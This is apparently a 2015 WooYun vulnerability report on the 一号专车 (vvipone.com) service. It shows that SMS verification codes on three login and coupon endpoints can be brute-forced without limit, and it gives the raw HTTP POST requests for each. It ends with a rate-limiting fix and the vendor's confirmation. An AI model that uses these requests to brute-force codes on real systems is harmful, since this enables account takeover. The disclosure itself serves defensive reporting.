wybug_title: 一号专车多处验证码存在逻辑权限(可爆破)
wybug_type: 网络设计缺陷/逻辑错误
wybug_detail:
漏洞详情 披露状态：   									2015-05-28：	细节已通知厂商并且等待厂商处理中									2015-05-28：	厂商已经确认，细节仅向厂商公开									2015-06-07：	细节向核心白帽子及相关领域专家公开									2015-06-17：	细节向普通白帽子公开									2015-06-27：	细节向实习白帽子公开									2015-07-12：	细节向公众公开  简要描述： * 详细说明：  0x01登录地址:http://redpocket.vvipone.com/campaign/dianrong/dianRongLogin.html获取完验证码然后直接爆破
POST /campaign/dianrong/signInUp.html HTTP/1.1Host: redpocket.vvipone.comProxy-Connection: keep-aliveContent-Length: 30Accept: */*Origin: http://redpocket.vvipone.comX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36 SE 2.X MetaSr 1.0Content-Type: application/x-www-form-urlencoded; charset=UTF-8Referer: http://redpocket.vvipone.com/campaign/dianrong/dianRongLogin.htmlAccept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Cookie: JSESSIONID=A2760171C30B34774D7DFD5708E416DD; campaign_sid_token=1BhRMEkBEyJ1QQ511431922453; CNZZDATA1254899576=1312352969-1431917312-%7C1431917312phone=手机号&captcha=验证码
9999个验证码,分分钟跑完.

0x02地址：http://customer.vvipone.com/web-customer/coupon/onlyCodeIndex.html?onlyCode=ABFJL7获取完验证码随意验证码登录爆破
POST /web-customer/coupon/onlyCodeExchange.html HTTP/1.1Host: customer.vvipone.comProxy-Connection: Keep-AliveContent-Length: 46Accept: */*Accept-Language: zh-CNContent-Type: application/x-www-form-urlencoded; charset=UTF-8User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0; SE 2.X MetaSr 1.0) like GeckoX-Requested-With: XMLHttpRequestReferer: http://customer.vvipone.com/web-customer/coupon/onlyCodeIndex.html?onlyCode=ABFJL7Accept-Encoding: gzip, deflateCookie: JSESSIONID=A46F47C646360C3DEF4CE248E226F58ConlyCode=ABFJL7&phone=手机号&captcha=验证码


爆破成功0x03地址：http://m.vvipone.com/h5/driver/index.html依旧获取验证码然后随意输入验证码爆破
POST /h5/driver/signInUp2.html HTTP/1.1Host: m.vvipone.comProxy-Connection: keep-aliveContent-Length: 30Accept: application/json, text/javascript, */*; q=0.01Origin: http://m.vvipone.comX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36 SE 2.X MetaSr 1.0Content-Type: application/x-www-form-urlencoded; charset=UTF-8Referer: http://m.vvipone.com/h5/driver/index.htmlAccept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Cookie: JSESSIONID=7AEA30C36632663F7D7A0702641B1BE6; CNZZDATA1253182018=1098670183-1431919192-%7C1431919192; Hm_lvt_91a7b876572b3b4bdfc5c3b662f3fb3e=1431659204,1431670603,1431670609,1431923043; Hm_lpvt_91a7b876572b3b4bdfc5c3b662f3fb3e=1431923043; CNZZDATA1254630600=106596312-1431922808-%7C1431922808phone=手机号&captcha=验证码


依然很快就爆到验证码。   漏洞证明：  RT   修复方案：  我看前面有人提交类似的了，但是你们只做了主站的限制，其他的几个没有做限制。   版权声明：转载请注明来源 ❤@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2015-05-28 18:00 厂商回复： 感谢提交 最新状态： 暂无
